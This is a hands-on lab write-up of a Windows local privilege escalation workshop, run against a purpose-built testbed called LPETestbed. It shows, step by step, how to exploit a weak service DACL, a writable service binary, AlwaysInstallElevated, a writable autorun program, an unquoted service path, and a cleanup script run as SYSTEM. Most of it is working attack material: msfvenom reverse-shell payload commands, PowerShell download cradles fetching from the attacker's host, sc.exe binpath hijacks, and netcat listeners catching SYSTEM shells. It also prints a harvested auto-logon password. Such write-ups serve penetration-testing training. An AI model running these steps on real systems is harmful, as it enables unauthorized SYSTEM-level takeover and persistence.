<h3>Privilege Escalation Workshop using LPE Workshop (https://github.com/sagishahar/lpeworkshop) and some of my own custom binaries and scripts.</h3>

Because this is a privilege escalation workshop, we are starting with a powershell reverse shell as a low privilege user. 

The goal for each exercise will be to get a NEW reverse shell as the NT\System user. 

We want to maintain our original low privilege shell so that we can have a backup shell.

<b>NOTE: Most of the time when exploiting services, we won't have rights to Start/Stop services. We would have to wait for a reboot. This workshop gives you Start/Stop rights so you don't have to reboot the machine constantly.</b>

Once we land on the machine, we want to get a quick look at the lay of the land. I have really been liking SharpUp from Ghostpack (https://github.com/GhostPack). SharpUp and Seatbelt are fantastic resources for enumerating privesc vectors. Let's start with SharpUp.

I setup a listening HTTP server and then transfer over the SharpUp binary so I can run it and see the results: 

Using this command in my powershell reverse shell: (New-Object System.Net.WebClient).DownloadFile("http://IPGOESHERE/SharpUp.exe", "C:\Users\user\Downloads\SharpUp.exe")

Then we run SharpUp.exe and look at the results.

The first thing we see is a Modifiable Service:

````
=== Modifiable Services ===

  Name             : daclsvc
  DisplayName      : DACL Service
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\DACL Service\daclservice.exe"
  ````

 
 This is a great place to start. This shows us that we can modify the binpath of the service. Bad access control on a service can lead to trivial privilege escalation. Any time that a standard user has rights to change the binary path (start location) of the service, they can hijack that into privilege escalation. The ability to change binary path should be restricted to Administrators only. This is usually a gross oversight on the part of the developers or the sysadmin that provisioned the box. DACL stands for Discretionary Access Control List. Windows defaults to giving everyone access to an object unless a DACL is defined: https://support.microsoft.com/en-us/help/914392/best-practices-and-guidance-for-writers-of-service-discretionary-acces
 
 
So we create an executable to get our new elevated shell:
 
msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service > daclservicehijack.exe

You notice the format is exe-service so that we don't immediately lose our shell on service start.

Then we transfer over the service file using our download logic again:

(New-Object System.Net.WebClient).DownloadFile("http://YOURIPHERE/daclservicehijack.exe", "C:\Users\user\Downloads\daclservicehijack.exe")

Then we modify the binpath of the service:

PS C:\Users\user\Downloads> sc.exe config daclsvc binpath= "C:\Users\user\Downloads\daclservicehijack.exe"
[SC] ChangeServiceConfig SUCCESS


Then we query to make sure our changes were successful:

PS C:\Users\user\Downloads> sc.exe qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\user\Downloads\daclservicehijack.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
PS C:\Users\user\Downloads> 


Then we start the service:

PS C:\Users\user\Downloads> net start daclsvc
The DACL Service service is starting.


Then we immediately get a shell as NT\Autorhity system:

root@kali:~/LPEWorkshop# nc -lvnp 31337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.22.6.98.
Ncat: Connection from 10.22.6.98:52636.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>whoami & hostname
whoami & hostname
nt authority\system
LPETestbed

C:\Windows\system32>

Next up let's tackle modifiable service binaries.

=== Modifiable Service Binaries ===

  Name             : filepermsvc
  DisplayName      : File Permissions Service
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\File Permissions Service\filepermservice.exe"

 So there is a service binary at that path that our user has full control over. Typically application developers will give users access to the folders of their binaries when they want to ease update processes or allow users to import custom modules/code. In this case, where the binary is tied to a service that was registered as NT\System, we can overwrite that binary to achieve privilege escalation.
 
 First let's verify the permissions on that file.
 
 PS C:\Program Files\File Permissions Service> icacls.exe *.exe
filepermservice.exe Everyone:(F)
                    NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
PS C:\Program Files\File Permissions Service> 

We can see that everyone has full control: Everyone:(F).

So let's use msfvenom to generate a service binary that we can use to replace that vulnerable service:

root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LHOST=YOURIPHERE LPORT=31337 -f exe-service > filepermservice.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe-service file: 15872 bytes

Note that we have to name it the same thing as the original service.

So now we replace the original service: (Note, if the service is running, it's difficult to replace this binary. This means that you could have a startup script that would try to swap the binaries before the service started but otherwise, you are out of luck. Luckily for us, the service is NOT running.)

Check the service one more time:
PS C:\Users\user\Downloads> sc.exe qc filepermsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
PS C:\Users\user\Downloads> 

Then we start the service:

PS C:\Users\user\Downloads> net start filepermsvc
The File Permissions Service service is starting.
PS C:\Users\user\Downloads> 

We get a reverse shell as the NT\SYSTEM user:
root@kali:~/LPEWorkshop# nc -lvnp 31337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.22.6.98.
Ncat: Connection from 10.22.6.98:63289.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
C:\Windows\system32>whoami & hostname
whoami & hostname
nt authority\system
LPETestbed

C:\Windows\system32>

Next let's look at "Always install elevated"

From SharpUp we see: 

=== AlwaysInstallElevated Registry Keys ===

  HKLM:    1
  HKCU:    1

  This means that any install that is run will automatically elevate the privileges it runs with so that low privilege users can run installs without needing an administrator to come over to their workstation.
  
  To exploit this we just need to run an .msi installer.
  
  We generate the payload:
  root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=10.22.6.122 -f msi > Install.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes

Then we transfer the payload to the victim machine:
(New-Object System.Net.WebClient).DownloadFile("http://YOURIPHERE/Install.msi", "C:\Users\user\Downloads\Install.msi")

Then when we run the install, we will get a reverse shell as NT\Authority System

root@kali:~/LPEWorkshop# nc -lvnp 31337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.22.6.98.
Ncat: Connection from 10.22.6.98:63300.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami & hostname
whoami & hostname
nt authority\system
LPETestbed

C:\Windows\system32>

Next let's look at AutoRuns:

From SharpUp:

=== Modifiable Registry Autoruns ===

  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : C:\Program Files\Autorun Program\program.exe
  
This means that we can replace the binary in that location with our malicious binary, and the next time an Administrator logs in, we will get an Administrator shell. This is an unreliable privesc and something that is more suited to persistence. We use msfvenom to generate the payload and then transfer it to the box.

PS C:\Users\user\Downloads> (New-Object System.Net.WebClient).DownloadFile("http://10.22.6.122/program.exe", "C:\Program Files\Autorun Program\program.exe")
PS C:\Users\user\Downloads> dir C:\Progra~1\"Autorun Program"


    Directory: C:\Program Files\Autorun Program


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
-a---        12/19/2019   8:34 AM      73802 program.exe                                                               


PS C:\Users\user\Downloads> 

Now the next time an Administrator logs into the machine, we will get a shell as an administrator. This is also useful for getting persistence as mentioned above.

Next let's take a look at something that will require a different privesc script (we will come back to SharpUp for some other stuff in a bit).

We are going to run Seatbelt (also from GhostPack) and see what we get there.

We transfer Seatbelt.exe over to the machine and see this for services: 
=== Non Microsoft Services (via WMI) ===

  Name             : daclsvc
  DisplayName      : DACL Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : C:\Users\user\Downloads\daclservicehijack.exe
  IsDotNet         : False

  Name             : dllsvc
  DisplayName      : DLL Hijack Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
  IsDotNet         : False

  Name             : filepermsvc
  DisplayName      : File Permissions Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\File Permissions Service\filepermservice.exe"
  IsDotNet         : False

  Name             : PathHijackService
  DisplayName      : PathHijackService
  Company Name     : 
  Description      : 
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files\Path Hijack\PathHijackService.exe"
  IsDotNet         : True

  Name             : regsvc
  DisplayName      : Insecure Registry Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
  IsDotNet         : False

  Name             : unquotedsvc
  DisplayName      : Unquoted Path Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
  IsDotNet         : False

 These are all of the non-standard Windows Services that are installed on the machine.
 
 If we look at the last one listed (ignoring the obvious name) we see that the PathName is missing quotes around the name. This can be an issue that will lead to privilege escalation IF we can control any piece of the path with a space along the way. If you do not quote the path to a service binary, Windows assumes you want to try to execute the binary at every stop along the directory path. Windows assumes you are passing arguments to a binary at the stops along the way. So the example above shows us that there are 3 stops along the way that could lead to execution. Let's take a look at this:
 
 C:\Program SPACE Files\Unquoted SPACE Path Service\Common SPACE Files\unquotedpathservice.exe
 
 Every place that SPACE appears, is a place that we could put a binary and hope that it gets executed. In order in the path we could put:
 
 C:\Program.exe
 C:\Program Files\Unquoted.exe
 C:\Program Files\Unquoted Path Service\Common.exe
 
 If we can write to any of these locations, we can achieve privilege escalation.
 
 Let's check our permissions each step along the way:
 
 First we check the root of the C:\ drive
 
PS C:\Users\user\Downloads> icacls.exe C:\      
C:\ BUILTIN\Administrators:(F)
    BUILTIN\Administrators:(OI)(CI)(IO)(F)
    NT AUTHORITY\SYSTEM:(F)
    NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
    BUILTIN\Users:(OI)(CI)(RX)
    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
    NT AUTHORITY\Authenticated Users:(AD)
    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)

Successfully processed 1 files; Failed processing 0 files

We see that we can read and execute, but we can't write.

Next stop:
PS C:\Users\user\Downloads> icacls.exe C:\Progra~1\
C:\Progra~1\ NT SERVICE\TrustedInstaller:(F)
             NT SERVICE\TrustedInstaller:(CI)(IO)(F)
             NT AUTHORITY\SYSTEM:(M)
             NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
             BUILTIN\Administrators:(M)
             BUILTIN\Administrators:(OI)(CI)(IO)(F)
             BUILTIN\Users:(RX)
             BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
             CREATOR OWNER:(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

We can't write to the Program Files folder either.

PS C:\Users\user\Downloads> icacls.exe C:\"Program Files"\"Unquoted Path Service"
C:\Program Files\Unquoted Path Service BUILTIN\Users:(F)
                                       NT SERVICE\TrustedInstaller:(I)(F)
                                       NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                       NT AUTHORITY\SYSTEM:(I)(F)
                                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Administrators:(I)(F)
                                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Users:(I)(RX)
                                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
PS C:\Users\user\Downloads> 

We can however write to the Unquoted Path Service folder.
This means that if we create an executable named Common.exe, we can get a reverse shell as NT\System the next time the service is started.

So, we create the binary: 

msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service > Common.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe-service file: 15872 bytes

Then we start our handler to catch the reverse shell:

root@kali:~/LPEWorkshop# nc -lvnp 31337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337


Then we transfer the binary:
PS C:\Program Files\Unquoted Path Service> (New-Object System.Net.WebClient).DownloadFile("http://10.22.6.122/Common.exe", "C:\Program Files\Unquoted Path Service\Common.exe")
PS C:\Program Files\Unquoted Path Service> ls


    Directory: C:\Program Files\Unquoted Path Service


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
d----        12/17/2019  12:31 PM            Common Files                                                              
-a---        12/19/2019   9:32 AM      15872 Common.exe                                                                


PS C:\Program Files\Unquoted Path Service>

Then we start the service:
net start unquotedsvc

Then we get a reverse shell as the NT\Authority System user:

root@kali:~/LPEWorkshop# nc -lvnp 31337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.22.6.49.
Ncat: Connection from 10.22.6.49:64557.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami & hostname
whoami & hostname
nt authority\system
LPETestbed

C:\Windows\system32>

While digging through Seatbelt: we find that there are registry auto-login settings: This gives us the local user credentials.
=== Registry Auto-logon Settings ===

  DefaultUserName         : user
  DefaultPassword         : password321
  
There is a scheduled task privesc in the LPE workshop, but I feel like it's not exploitable, so I am going to inject a scheduled task privesc that I have seen on Windows a number of times.

Developers LOVE to comment their code and scripts. So if we find a writable directory that appears to be a Dev folder: C:\DevTools we should read through the code in there.

Because this is contrived, it will be a little easier to identify. Let's talk about other things though. If we read through some code/script that looks like it should be run frequently (cleanup, provision) we can assume some privileged user is running that script. We can inject our logic into that script and try to privilege escalation. These are also a FANTASTIC place to find credentials. Lazy sysadmins LOVE to put credentials in their scripts to eliminate the chance of error. If it "just works" then it's better for everyone.

PS C:\DevTools> ls


    Directory: C:\DevTools


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
-a---        12/19/2019  10:12 AM        208 Cleanup.ps1                                                               


PS C:\DevTools> 

We can see there is a Cleanup script in the folder. Let's take a look at what it does.

PS C:\DevTools> Get-Content Cleanup.ps1
#This script is run every 5 minutes to clean up the dev tools directory.
#This will make sure all of your .txt files get cleaned up. It's running as SYSTEM to make sure permissions are NOT an issue
Remove-Item "C:\DevTools\*.txt"
PS C:\DevTools> 

This script is annotated for us, and tells us that it will run every 5 minutes to purge the current directory of all .txt files. So if we create our own reverse shell and place it in that powershell script, we will get a new reverse shell as the NT\Authority System user.

You might think this exercise is 100% contrived, but I have seen this privesc a great number of times.

So let's create the reverse shell.

Take the powershell reverse shell from: https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

Edit the IP and Port.

Encode using: https://raikia.com/tool-powershell-encoder/

Put that into Cleanup.ps1 on your attacking machine.

Then we transfer the script to our victim:

(New-Object System.Net.WebClient).DownloadFile("http://YOURIPHERE/Cleanup.ps1", "C:\DevTools\Cleanup.ps1")

Then we wait.

Now we see we have a Powershell reverse shell as NT\Authority System

root@kali:~/LPEWorkshop# nc -lvnp 31337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.22.6.49.
Ncat: Connection from 10.22.6.49:64606.

PS C:\Windows\system32> whoami.exe
nt authority\system
PS C:\Windows\system32> hostname.exe
LPETestbed
PS C:\Windows\system32>
